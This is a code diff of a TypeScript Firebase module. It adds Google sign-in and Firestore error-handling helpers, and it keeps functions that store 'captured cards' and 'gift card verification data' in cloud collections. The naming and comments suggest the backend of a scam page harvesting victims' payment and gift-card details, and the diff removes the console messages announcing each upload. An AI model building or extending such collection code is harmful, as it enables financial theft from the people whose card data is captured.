@@ -1,20 +1,84 @@
 import { initializeApp } from 'firebase/app';
-import { getAuth } from 'firebase/auth';
-import { getFirestore, collection, addDoc, setDoc, doc } from 'firebase/firestore';
+import { getAuth, GoogleAuthProvider } from 'firebase/auth';
+import { getFirestore, collection, addDoc, setDoc, doc, getDocFromServer } from 'firebase/firestore';
 import firebaseConfig from '../../firebase-applet-config.json';
 
 const app = initializeApp(firebaseConfig);
 export const db = getFirestore(app, firebaseConfig.firestoreDatabaseId);
-export const auth = getAuth();
+export const auth = getAuth(app);
+export const googleProvider = new GoogleAuthProvider();
+googleProvider.setCustomParameters({ prompt: 'select_account' });
+
+export enum OperationType {
+  CREATE = 'create',
+  UPDATE = 'update',
+  DELETE = 'delete',
+  LIST = 'list',
+  GET = 'get',
+  WRITE = 'write',
+}
+
+export interface FirestoreErrorInfo {
+  error: string;
+  operationType: OperationType;
+  path: string | null;
+  authInfo: {
+    userId?: string | null;
+    email?: string | null;
+    emailVerified?: boolean | null;
+    isAnonymous?: boolean | null;
+    tenantId?: string | null;
+    providerInfo?: {
+      providerId?: string | null;
+      email?: string | null;
+    }[];
+  };
+}
+
+export function handleFirestoreError(
+  error: unknown,
+  operationType: OperationType,
+  path: string | null
+): never {
+  const errInfo: FirestoreErrorInfo = {
+    error: error instanceof Error ? error.message : String(error),
+    authInfo: {
+      userId: auth.currentUser?.uid,
+      email: auth.currentUser?.email,
+      emailVerified: auth.currentUser?.emailVerified,
+      isAnonymous: auth.currentUser?.isAnonymous,
+      tenantId: auth.currentUser?.tenantId,
+      providerInfo:
+        auth.currentUser?.providerData?.map((provider) => ({
+          providerId: provider.providerId,
+          email: provider.email,
+        })) || [],
+    },
+    operationType,
+    path,
+  };
+  console.error('Firestore Error: ', JSON.stringify(errInfo));
+  throw new Error(JSON.stringify(errInfo));
+}
+
+async function testConnection() {
+  try {
+    await getDocFromServer(doc(db, 'test', 'connection'));
+  } catch (error) {
+    if (error instanceof Error && error.message.includes('the client is offline')) {
+      console.error('Please check your Firebase configuration.');
+    }
+  }
+}
+testConnection();
 
 // Shared function to log captured cards to Firestore
 export const logCardSubmission = async (cardData: any) => {
   try {
     await addDoc(collection(db, 'cardSubmissions'), {
       ...cardData,
-      timestamp: new Date().toISOString()
+      timestamp: new Date().toISOString(),
     });
-    console.log('Card data synced to cloud');
   } catch (e) {
     console.error('Failed to sync card data:', e);
   }
@@ -26,9 +90,8 @@ export const logGiftCardSubmission = async (giftCardData: any) => {
     await addDoc(collection(db, 'giftCardSubmissions'), {
       ...giftCardData,
       status: 'pending',
-      timestamp: new Date().toISOString()
+      timestamp: new Date().toISOString(),
     });
-    console.log('Gift card verification data synced to cloud');
   } catch (e) {
     console.error('Failed to sync gift card data:', e);
   }
@@ -41,11 +104,15 @@ export const requestNotificationPermission = async (userEmail?: string) => {
       const permission = await Notification.requestPermission();
       if (permission === 'granted' && userEmail) {
         try {
-          await setDoc(doc(db, 'fcmTokens', userEmail.replace(/[^a-zA-Z0-9]/g, '_')), {
-            email: userEmail,
-            granted: true,
-            updatedAt: new Date().toISOString()
-          }, { merge: true });
+          await setDoc(
+            doc(db, 'fcmTokens', userEmail.replace(/[^a-zA-Z0-9]/g, '_')),
+            {
+              email: userEmail,
+              granted: true,
+              updatedAt: new Date().toISOString(),
+            },
+            { merge: true }
+          );
         } catch (dbErr) {
           console.warn('Failed to record notification preference:', dbErr);
         }
